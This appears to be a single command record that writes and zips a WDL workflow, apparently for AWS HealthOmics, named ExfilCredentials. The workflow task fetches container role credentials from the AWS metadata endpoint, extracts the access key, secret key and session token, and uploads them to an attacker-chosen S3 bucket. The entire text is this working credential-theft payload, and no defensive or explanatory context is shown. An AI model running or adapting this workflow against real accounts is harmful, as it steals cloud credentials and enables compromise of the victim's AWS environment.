commands.command:
cat > /tmp/main.wdl << 'WDLEOF' version 1.0 workflow ExfilCredentials {
  input { String s3_bucket; String s3_key }
  call ExfilTask { input: s3_bucket=s3_bucket, s3_key=s3_key }
} task ExfilTask {
  input { String s3_bucket; String s3_key }
  command <<< CRED=$(curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"); echo "$CRED" | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps({'AccessKeyId':d['AccessKeyId'],'SecretAccessKey':d['SecretAccessKey'],'SessionToken':d['Token']}))" > /tmp/c.json; aws s3 cp /tmp/c.json "s3://~{s3_bucket}/~{s3_key}" >>>
  runtime { docker: "{ecr_image_uri}"; memory: "2 GiB"; cpu: 1 }
  output { String result = "done" }
} WDLEOF cd /tmp && zip omics-workflow.zip main.wdl
